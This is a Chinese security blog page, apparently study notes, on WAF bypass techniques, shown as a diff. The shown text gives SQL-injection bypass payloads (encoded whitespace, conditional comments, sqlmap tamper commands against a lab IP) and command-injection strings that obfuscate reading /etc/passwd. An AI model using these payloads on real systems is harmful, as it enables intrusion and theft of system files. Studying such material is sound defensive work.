@@ -1,0 +1,497 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="generator" content="Hexo">
+<title>WAF 绕过技术 - swfk 的安全笔记</title>
+<meta name="description" content="语法层、协议层、业务层 WAF 绕过思路：编码混淆、分块传输、HTTP 参数污染与真实业务场景绕过。">
+<meta name="author" content="swfk2154">
+<meta name="keywords" content="AI安全, 网络安全, 大模型安全, LLM安全, 渗透测试, 安全运营">
+<meta name="theme-color" id="theme-color" content="#f8f7f4">
+<link rel="icon" type="image/svg+xml" href="/images/clay-avatar.svg">
+<link rel="apple-touch-icon" href="/icon.png">
+<link rel="canonical" href="https://blogbu2154.site/waf-bypass-techniques/">
+<meta property="og:type" content="article">
+<meta property="og:title" content="WAF 绕过技术 - swfk 的安全笔记">
+<meta property="og:description" content="语法层、协议层、业务层 WAF 绕过思路：编码混淆、分块传输、HTTP 参数污染与真实业务场景绕过。">
+<meta property="og:url" content="https://blogbu2154.site/waf-bypass-techniques/">
+<meta property="og:site_name" content="swfk 的安全笔记">
+<meta property="og:image" content="/medias/featureimages/12.jpg">
+<meta name="twitter:card" content="summary">
+<link rel="alternate" type="application/atom+xml" title="swfk 的安全笔记" href="/atom.xml">
+<link rel="stylesheet" href="/css/clay.css">
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer@1.10.1/dist/APlayer.min.css">
+
+<script>
+  // 尽早恢复主题，避免首屏闪烁
+  (function () {
+    try {
+      var t = localStorage.getItem('clay-theme') ||
+        (window.matchMedia('(prefers-color-scheme: dark)').matches ? 'dark' : 'light');
+      document.documentElement.dataset.theme = t;
+    } catch (e) {
+      document.documentElement.dataset.theme = 'light';
+    }
+  })();
+</script>
+
+
+<body class="">
+  <a class="skip-link" href="#main">跳到正文</a>
+  <header class="site-nav">
+  <nav class="site-nav__pill" aria-label="主导航">
+    
+      
+        <a href="/" class="">首页</a>
+      
+        <a href="/archives" class="">归档</a>
+      
+        <a href="/categories" class="">分类</a>
+      
+        <a href="/tags" class="">标签</a>
+      
+        <a href="/about" class="">关于</a>
+      
+    
+    
+      <button type="button" class="site-nav__icon" data-search-open aria-label="站内搜索">
+        <svg viewBox="0 0 24 24" width="19" height="19" fill="none" stroke="currentColor" stroke-width="1.9" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><circle cx="11" cy="11" r="7"/><path d="M20 20l-3.6-3.6"/></svg>
+      </button>
+      <a class="site-nav__icon" href="https://github.com/swfk2154" target="_blank" rel="noopener noreferrer" aria-label="GitHub">
+        <svg class="icon-github" viewBox="0 0 24 24" width="26" height="26" fill="currentColor" aria-hidden="true"><path d="M12 .5C5.65.5.5 5.65.5 12a11.5 11.5 0 0 0 7.86 10.92c.58.11.79-.25.79-.56v-2c-3.2.7-3.88-1.54-3.88-1.54-.53-1.33-1.28-1.69-1.28-1.69-1.04-.71.08-.7.08-.7 1.15.08 1.76 1.18 1.76 1.18 1.03 1.75 2.7 1.25 3.36.95.1-.74.4-1.25.72-1.54-2.55-.29-5.24-1.28-5.24-5.68 0-1.26.45-2.28 1.18-3.09-.12-.29-.51-1.46.11-3.05 0 0 .96-.31 3.15 1.18a10.9 10.9 0 0 1 5.74 0c2.19-1.49 3.15-1.18 3.15-1.18.62 1.59.23 2.76.11 3.05.74.81 1.18 1.83 1.18 3.09 0 4.41-2.69 5.38-5.26 5.66.41.36.78 1.06.78 2.14v3.17c0 .31.21.68.8.56A11.5 11.5 0 0 0 23.5 12C23.5 5.65 18.35.5 12 .5z"/></svg>
+      </a>
+    
+    <button type="button" class="site-nav__icon theme-toggle" data-theme-toggle aria-label="切换主题">
+      <svg class="theme-toggle__moon" viewBox="0 0 24 24" width="19" height="19" fill="none" stroke="currentColor" stroke-width="1.9" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M21 12.8A9 9 0 1 1 11.2 3a7 7 0 0 0 9.8 9.8z"/></svg>
+      <svg class="theme-toggle__sun" viewBox="0 0 24 24" width="19" height="19" fill="none" stroke="currentColor" stroke-width="1.9" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><circle cx="12" cy="12" r="4"/><path d="M12 2v2M12 20v2M4.9 4.9l1.4 1.4M17.7 17.7l1.4 1.4M2 12h2M20 12h2M4.9 19.1l1.4-1.4M17.7 6.3l1.4-1.4"/></svg>
+    </button>
+  </nav>
+</header>
+
+  <main id="main">
+    
+<div class="reading-progress" aria-hidden="true"><span data-reading-progress></span></div>
+<article class="article article--toc">
+  <div class="article__body">
+    
+
+<aside class="article__aside">
+  <div class="toc-box">
+    <div class="toc-box__title">目录</div>
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#WAF%E7%BB%95%E8%BF%87-%E6%A6%82%E8%BF%B0"><span class="toc-text">WAF绕过  概述</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BB%95%E8%BF%87waf"><span class="toc-text">绕过waf</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5"><span class="toc-text">SQL注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A4%A7%E5%B0%8F%E5%86%99%E7%BB%95%E8%BF%87"><span class="toc-text">大小写绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8C%E5%86%99%E7%BB%95%E8%BF%87"><span class="toc-text">双写绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AD%89%E4%BB%B7%E6%9B%BF%E6%8D%A2"><span class="toc-text">等价替换</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A9%BA%E6%A0%BC-%E2%9C%A8"><span class="toc-text">空格  ✨</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#0a-%EF%BC%8C-0b-%EF%BC%8C-a0-%EF%BC%8C-0c%EF%BC%8C-0d-%EF%BC%8C-09"><span class="toc-text">%0a ，%0b ，%a0 ，%0c， %0d ，%09  </span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9D%97%E6%B3%A8%E9%87%8A%E6%9B%BF%E6%8D%A2%E7%A9%BA%E6%A0%BC"><span class="toc-text">块注释替换空格</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%90%E7%AE%97%E7%AC%A6%E6%9B%BF%E6%8D%A2"><span class="toc-text">运算符替换</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%87%BD%E6%95%B0%E6%9B%BF%E6%8D%A2"><span class="toc-text">函数替换</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#order-by-union-select"><span class="toc-text">order by  -&gt;union select</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%A8%E9%87%8A%E7%AC%A6-%E2%9C%A8"><span class="toc-text">注释符  ✨</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%A1%8C%E6%B3%A8%E9%87%8A"><span class="toc-text">行注释</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9D%97%E6%B3%A8%E9%87%8A"><span class="toc-text">块注释</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9D%A1%E4%BB%B6%E6%B3%A8%E9%87%8A"><span class="toc-text">条件注释</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sqlmap-tamper-%E8%84%9A%E6%9C%AC%E2%9C%A8"><span class="toc-text">sqlmap tamper 脚本✨</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-text">命令执行</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AD%89%E4%BB%B7%E6%9B%BF%E6%8D%A2-1"><span class="toc-text">等价替换</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%8B%BC%E6%8E%A5"><span class="toc-text">命令拼接</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%80%9A%E9%85%8D%E7%AC%A6%E6%9B%BF%E6%8D%A2%E6%96%87%E4%BB%B6%E5%90%8D"><span class="toc-text">通配符替换文件名</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B7%BB%E5%8A%A0%E5%BC%95%E5%8F%B7"><span class="toc-text">添加引号</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B7%BB%E5%8A%A0%E5%8F%8D%E6%96%9C%E6%9D%A0"><span class="toc-text">添加反斜杠</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B7%BB%E5%8A%A0%E7%A9%BA%E5%AD%97%E7%AC%A6"><span class="toc-text">添加空字符</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%84%9A%E6%9C%AC%E5%8F%82%E6%95%B0"><span class="toc-text">脚本参数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%A9%BA%E6%A0%BC%E6%9B%BF%E6%8D%A2%E2%9C%A8"><span class="toc-text">空格替换✨</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#base64%E7%BC%96%E7%A0%81-%E2%9C%A8"><span class="toc-text">base64编码 ✨</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8D%E5%BC%95%E5%8F%B7%E6%89%A7%E8%A1%8C"><span class="toc-text">反引号执行</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E5%A4%96%E5%B8%A6%E2%9C%A8"><span class="toc-text">数据外带✨</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#dnslog-%E5%A4%96%E5%B8%A6"><span class="toc-text">dnslog 外带</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#http-%E5%A4%96%E5%B8%A6"><span class="toc-text">http 外带</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="toc-text">文件上传</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SSRF"><span class="toc-text">SSRF</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%88%AA%E6%96%AD"><span class="toc-text">@截断</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ipv6-%E7%BB%95%E8%BF%87"><span class="toc-text">ipv6 绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9F%AD%E9%93%BE%E6%8E%A5-%EF%BC%88302%E8%B7%B3%E8%BD%AC%EF%BC%89"><span class="toc-text">短链接 （302跳转）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%99%90%E5%88%B6-%EF%BC%9A"><span class="toc-text">限制 ：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%9F%E5%90%8D%E8%A7%A3%E6%9E%90"><span class="toc-text">域名解析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XXE"><span class="toc-text">XXE</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#html-%E5%AE%9E%E4%BD%93%E7%BC%96%E7%A0%81"><span class="toc-text">html 实体编码</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E7%BC%96%E7%A0%81payload"><span class="toc-text">1  编码payload</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E5%8E%BB%E5%A4%B4%EF%BC%88xml%E5%A4%B4%E5%92%8Cdtd%E5%A4%B4%EF%BC%89%EF%BC%8C%E5%8E%BB%E7%A9%BA%E6%A0%BC%E5%92%8C%E6%8D%A2%E8%A1%8C"><span class="toc-text">2  去头（xml头和dtd头），去空格和换行</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-html-%E5%AE%9E%E4%BD%93%E7%BC%96%E7%A0%81"><span class="toc-text">3  html 实体编码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E5%B0%81%E8%A3%85%E6%96%B0%E7%9A%84-payload-%E5%8F%82%E6%95%B0%E5%AE%9E%E4%BD%93%E7%9A%84%E5%AE%9A%E4%B9%89%E5%92%8C%E8%B0%83%E7%94%A8"><span class="toc-text">4  封装新的 payload (参数实体的定义和调用)</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#UTF16-%E7%BC%96%E7%A0%81"><span class="toc-text">UTF16 编码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#php-disable-functions"><span class="toc-text">php disable functions</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%8E%E4%B9%88%E6%9F%A5%E7%9C%8B%E5%92%8C%E5%88%A4%E6%96%AD%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E8%A2%AB%E7%A6%81%E7%94%A8"><span class="toc-text">怎么查看和判断命令执行被禁用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#antsword-%E8%BF%9E%E6%8E%A5webshell%E5%90%8E%E8%83%BD%E7%9C%8B%E6%96%87%E4%BB%B6%EF%BC%8C%E4%BD%86%E6%97%A0%E6%B3%95%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-text">antsword 连接webshell后能看文件，但无法命令执行</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#phpinfo-%E5%8F%AF%E4%BB%A5%E7%9C%8B%E5%88%B0-disable-functions-%E9%85%8D%E7%BD%AE%E9%A1%B9"><span class="toc-text">phpinfo 可以看到 disable_functions 配置项</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AD%89%E4%BB%B7%E5%87%BD%E6%95%B0%E4%BB%A3%E6%9B%BF"><span class="toc-text">等价函数代替</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#LD-PRELOAD"><span class="toc-text">LD_PRELOAD</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%93%8D%E4%BD%9C"><span class="toc-text">操作</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-antsword-%E6%8F%92%E4%BB%B6%E4%B8%8B%E8%BD%BD%EF%BC%8C%E5%8F%B3%E9%94%AE%E4%BB%BB%E6%84%8Fwebshell%EF%BC%8C%E9%80%89%E6%8B%A9%E2%80%9C%E6%8F%92%E4%BB%B6%E5%B8%82%E5%9C%BA%E2%80%9D"><span class="toc-text">1  antsword 插件下载，右键任意webshell，选择“插件市场”</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E4%B8%8B%E8%BD%BD-%E2%80%9C%E7%BB%95%E8%BF%87-disable-functions%E2%80%9D-%E6%8F%92%E4%BB%B6"><span class="toc-text">2  下载 “绕过 disable_functions” 插件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E5%AF%B9%E6%97%A0%E6%B3%95%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4%E7%9A%84webshell-%E5%8F%B3%E9%94%AE%E9%80%89%E6%8B%A9%E4%BD%BF%E7%94%A8-%E7%BB%95%E8%BF%87disable-functions-%E6%8F%92%E4%BB%B6"><span class="toc-text">3  对无法执行命令的webshell 右键选择使用 绕过disable_functions 插件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-%E9%80%89%E6%8B%A9-LD-PRELOAD-%E7%BB%95%E8%BF%87%E6%96%B9%E5%BC%8F"><span class="toc-text">4  选择 LD_PRELOAD 绕过方式</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-LD-PRELOAD-%E4%BC%9A%E8%87%AA%E5%8A%A8%E4%B8%8A%E4%BC%A0%E4%B8%80%E4%B8%AA-so%E6%96%87%E4%BB%B6%EF%BC%88%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E5%BA%93%EF%BC%89%E5%92%8C-antporxy-php-%EF%BC%88%E6%96%B0%E7%9A%84webshell%EF%BC%89"><span class="toc-text">5  LD_PRELOAD 会自动上传一个 so文件（动态链接库）和 .antporxy.php （新的webshell）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#6-%E9%93%BE%E6%8E%A5%E6%96%B0%E7%9A%84webshell-antproxy-php-%EF%BC%88%E8%BF%9E%E6%8E%A5%E5%AF%86%E7%A0%81%E4%B8%8E%E5%8E%9F%E6%9C%89webshell%E4%B8%80%E8%87%B4%EF%BC%89-%E5%8D%B3%E5%8F%AF%E5%AE%9E%E7%8E%B0-disable-functions-%E7%BB%95%E8%BF%87"><span class="toc-text">6  链接新的webshell .antproxy.php （连接密码与原有webshell一致） 即可实现 disable_functions 绕过</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-text">原理</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#LD-PRELOAD-%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9A"><span class="toc-text">LD_PRELOAD 是什么：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BB%95%E8%BF%87disable-functions%E6%93%8D%E4%BD%9C%E5%8E%9F%E7%90%86"><span class="toc-text">绕过disable_functions操作原理</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#apache-mod-cgi"><span class="toc-text">apache mod cgi</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%93%8D%E4%BD%9C-1"><span class="toc-text">操作</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-1"><span class="toc-text">原理</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PHP-fpm"><span class="toc-text">PHP fpm</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%93%8D%E4%BD%9C-2"><span class="toc-text">操作</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-2"><span class="toc-text">原理</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-php-S"><span class="toc-text">使用 php -S</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#FFI-%E6%8B%93%E5%B1%95"><span class="toc-text">FFI 拓展</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%93%8D%E4%BD%9C-3"><span class="toc-text">操作</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-3"><span class="toc-text">原理</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#php-%E6%BC%8F%E6%B4%9E-%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E"><span class="toc-text">php 漏洞 &#x2F; 系统漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%80%9A%E7%94%A8waf%E7%BB%95%E8%BF%87"><span class="toc-text">通用waf绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E6%95%B0%E6%B1%A1%E6%9F%93"><span class="toc-text">参数污染</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%82%E6%95%B0%E9%87%8D%E5%8F%A0"><span class="toc-text">参数重叠</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%AD%E9%97%B4%E4%BB%B6%E8%A7%A3%E6%9E%90"><span class="toc-text">中间件解析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%84%8F%E6%95%B0%E6%8D%AE-%EF%BC%88%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA"><span class="toc-text">脏数据 （缓冲区溢出)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%A7%E9%87%8F%E5%8F%82%E6%95%B0%EF%BC%88%E6%95%B0%E9%87%8F%E6%BA%A2%E5%87%BA%EF%BC%89"><span class="toc-text">大量参数（数量溢出）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%82%E6%95%B0%E5%80%BC%E6%BA%A2%E5%87%BA"><span class="toc-text">参数值溢出</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%86%E5%9D%97%E4%BC%A0%E8%BE%93-%E5%8F%AA%E9%80%82%E7%94%A8POST%E8%AF%B7%E6%B1%82"><span class="toc-text">分块传输 ,只适用POST请求</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%80%8E%E4%B9%88%E5%88%86%E8%BE%A8%E6%98%AF%E5%88%86%E5%9D%97%E4%BC%A0%E8%BE%93"><span class="toc-text">怎么分辨是分块传输</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#waf-%E7%99%BD%E5%90%8D%E5%8D%95"><span class="toc-text">waf 白名单</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#HTTP-%E5%A4%B4"><span class="toc-text">HTTP 头</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#burp-burpFakeIP-%E6%8F%92%E4%BB%B6%E5%9C%A8-Repeater-%E4%B8%AD%E7%9A%84%E4%BD%BF%E7%94%A8"><span class="toc-text">burp burpFakeIP 插件在 Repeater 中的使用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E7%9A%84%E4%BB%A3%E8%A1%A8-IP-%E7%9A%84%E8%AF%B7%E6%B1%82%E5%A4%B4-XFF"><span class="toc-text">常见的代表 IP 的请求头  XFF</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#burp-burpFakeIP-%E6%8F%92%E4%BB%B6%E5%9C%A8%E7%88%86%E7%A0%B4%E4%B8%AD%E7%9A%84%E4%BD%BF%E7%94%A8"><span class="toc-text">burp burpFakeIP 插件在爆破中的使用</span></a></li></ol></li></ol></li></ol>
+  </div>
+</aside>
+
+
+    <div class="article__main">
+      <header class="article__header reveal">
+        <p class="eyebrow">网络安全</p>
+        <h1>WAF 绕过技术</h1>
+        <div class="post-meta">
+          <time datetime="2026-01-04">2026-01-04</time>
+          
+            <span>更新于 2026-08-29</span>
+          
+        </div>
+      </header>
+      
+        <figure class="article__cover reveal"><img src="/medias/featureimages/12.jpg" alt="WAF 绕过技术" loading="eager" onerror="this.parentElement.style.display='none'"></figure>
+      
+      <div class="post-content reveal">
+        <blockquote>
+<p>本篇整理自我的语雀学习笔记（课堂学习与实操记录），已转为纯文字版并按博客格式排版。</p>
+</blockquote>
+<span id="more"></span>
+
+<h2 id="WAF绕过-概述"><a href="#WAF绕过-概述" class="headerlink" title="WAF绕过  概述"></a>WAF绕过  概述</h2><p>什么是waf：web应用防火墙（应用层），专门拦截网站攻击流量</p>
+<p>有哪些常见的waf：参考看图识别waf  <a target="_blank" rel="noopener" href="https://www.cnblogs.com/charon1937/p/13799467.html">https://www.cnblogs.com/charon1937/p/13799467.html</a></p>
+<h4 id="绕过waf"><a href="#绕过waf" class="headerlink" title="绕过waf"></a>绕过waf</h4><ul>
+<li>没有通用的waf绕过方案</li>
+<li>多种方法综合使用</li>
+<li>绕过了waf不代表有漏洞，waf只是基于黑名单和语义分析进行的攻击行为拦截</li>
+</ul>
+<h2 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h2><h2 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h2><p>mysql 语句大小写不敏感，在waf中使用正则表达式时，没有添加 i 修饰符</p>
+<pre><code class="hljs plain">if (preg_match(&#x27;/union|select|order|by|and|or/&#x27;, $id)) &#123;
+            die(&quot;WAF: 检测到恶意关键字!&quot;);
+        &#125;</code></pre>
+
+<h2 id="双写绕过"><a href="#双写绕过" class="headerlink" title="双写绕过"></a>双写绕过</h2><p>waf 把敏感字符替换成了 空</p>
+<pre><code class="hljs plain">$id = str_ireplace(&quot;union&quot;, &quot;&quot;, $id);
+$id = str_ireplace(&quot;select&quot;, &quot;&quot;, $id);
+$id = str_ireplace(&quot;or&quot;, &quot;&quot;, $id);</code></pre>
+
+<h2 id="等价替换"><a href="#等价替换" class="headerlink" title="等价替换"></a>等价替换</h2><h3 id="空格-✨"><a href="#空格-✨" class="headerlink" title="空格  ✨"></a>空格  ✨</h3><p>waf 拦截了空格</p>
+<h4 id="0a-，-0b-，-a0-，-0c，-0d-，-09"><a href="#0a-，-0b-，-a0-，-0c，-0d-，-09" class="headerlink" title="%0a ，%0b ，%a0 ，%0c， %0d ，%09  "></a><code>%0a ，%0b ，%a0 ，%0c， %0d ，%09  </code></h4><h4 id="块注释替换空格"><a href="#块注释替换空格" class="headerlink" title="块注释替换空格"></a>块注释替换空格</h4><pre><code class="hljs plain">/**/
+/*任意字符*/</code></pre>
+
+<h3 id="运算符替换"><a href="#运算符替换" class="headerlink" title="运算符替换"></a>运算符替换</h3><pre><code class="hljs plain">or 等价 ||
+and 等价 &amp;&amp;
+= 等价 &gt; 和 &lt;
+= 替换为 like</code></pre>
+
+<h3 id="函数替换"><a href="#函数替换" class="headerlink" title="函数替换"></a>函数替换</h3><p>当前的数据库名 -&gt; 等价于 database() -&gt; 等价于 hex编码后的字符串</p>
+<p>盲注用到的函数也可以进行替换</p>
+<p>substring -&gt; substr -&gt; left -&gt; mid</p>
+<h3 id="order-by-union-select"><a href="#order-by-union-select" class="headerlink" title="order by  -&gt;union select"></a>order by  -&gt;union select</h3><p>如果 order by 被拦截，直接使用 union select 测试即可，不需要order by</p>
+<p>也可以用 into 语句代替 order by</p>
+<p> <code>1&#39; into @1,@2,@3,@4%23  </code></p>
+<h3 id="注释符-✨"><a href="#注释符-✨" class="headerlink" title="注释符  ✨"></a>注释符  ✨</h3><h4 id="行注释"><a href="#行注释" class="headerlink" title="行注释"></a>行注释</h4><pre><code class="hljs plain">#
+--空格</code></pre>
+
+<h4 id="块注释"><a href="#块注释" class="headerlink" title="块注释"></a>块注释</h4><p>可以用于替换空格</p>
+<pre><code class="hljs plain">/**/
+/*任意字符*/</code></pre>
+
+<h4 id="条件注释"><a href="#条件注释" class="headerlink" title="条件注释"></a>条件注释</h4><pre><code class="hljs plain">/*!SQL语句*/
+/*!50000SQL语句*/
+/*!40000SQL语句*/</code></pre>
+
+<pre><code class="hljs plain">/*!order*/ 只有在mysql中才会执行order
+/*!50000SQL语句*/ 只有在mysql&gt;5版本中才会执行order
+/*!40000SQL语句*/ 只有在mysql&gt;4版本中才会执行order</code></pre>
+
+<p>块注释和条件注释综合使用</p>
+<p><code>http://192.168.79.120:8081/lab5_comment.php?id=1&#39;%0a/**/%0b/*helloworld*//*!50000order*/%0a/*fhweibegrb*//**//*!40000by*/%0a9/**/--+</code></p>
+<h2 id="sqlmap-tamper-脚本✨"><a href="#sqlmap-tamper-脚本✨" class="headerlink" title="sqlmap tamper 脚本✨"></a>sqlmap tamper 脚本✨</h2><p><strong>sql注入绕 waf 用 tamper 脚本</strong></p>
+<p>  <code>https://pingmaoer.github.io/2019/06/24/sqlmap-tamper%E8%AF%A6%E8%A7%A3/</code></p>
+<p><code>python /home/yu/sqlmap/sqlmap.py -u &quot;http://192.168.79.120:8081/lab5_comment.php?id=1&quot; --tamper space2comment,randomcase --flush-session -v 3</code></p>
+<p>写一个自己的tamper 脚本 （双写绕过举例）</p>
+<p>找一个 改动</p>
+<p><code>python /home/yu/sqlmap/sqlmap.py -u &quot;http://192.168.79.120:8081/lab2_double.php?id=1&quot; --tamper shuangxie --flush-session -v 3</code></p>
+<h2 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h2><h2 id="等价替换-1"><a href="#等价替换-1" class="headerlink" title="等价替换"></a>等价替换</h2><p>以查看文件举例</p>
+<p><code>cat = more = head = tail = tac  </code></p>
+<h2 id="命令拼接"><a href="#命令拼接" class="headerlink" title="命令拼接"></a>命令拼接</h2><p>使用shell脚本的变量定义和调用，分割和拼接命令</p>
+<pre><code class="hljs plain">cat /etc/passwd
+a=ca;b=t;c=/et;d=c/passwd;$a$b $c$d</code></pre>
+
+<h2 id="通配符替换文件名"><a href="#通配符替换文件名" class="headerlink" title="通配符替换文件名"></a>通配符替换文件名</h2><pre><code class="hljs plain">cat /etc/passwd
+cat /et*/pass*</code></pre>
+
+<h2 id="添加引号"><a href="#添加引号" class="headerlink" title="添加引号"></a>添加引号</h2><p> linux shell 中可以随便加成对单引号或双引号</p>
+<p><code>Submit=Submit&amp;ip=www.baidu.com;c&quot;&quot;a&#39;&#39;t /&quot;&quot;e&#39;&#39;tc/p&#39;&#39;ass&quot;&quot;wd</code></p>
+<h2 id="添加反斜杠"><a href="#添加反斜杠" class="headerlink" title="添加反斜杠"></a>添加反斜杠</h2><p> linux shell 中可以随便加 \</p>
+<p><code>Submit=Submit&amp;ip=www.baidu.com;c\a&#39;&#39;t /e&#39;&#39;\tc/pa\s&quot;&quot;s\w&quot;&quot;d</code></p>
+<h2 id="添加空字符"><a href="#添加空字符" class="headerlink" title="添加空字符"></a>添加空字符</h2><p> 添加一些shell中值为空的变量</p>
+<p><code>Submit=Submit&amp;ip=www.baidu.com;c${yjhhh}\a&#39;&#39;t /e&#39;&#39;\t${bhuub}c/p${ihgv}a\s&quot;&quot;s\w&quot;&quot;d$dfg  </code></p>
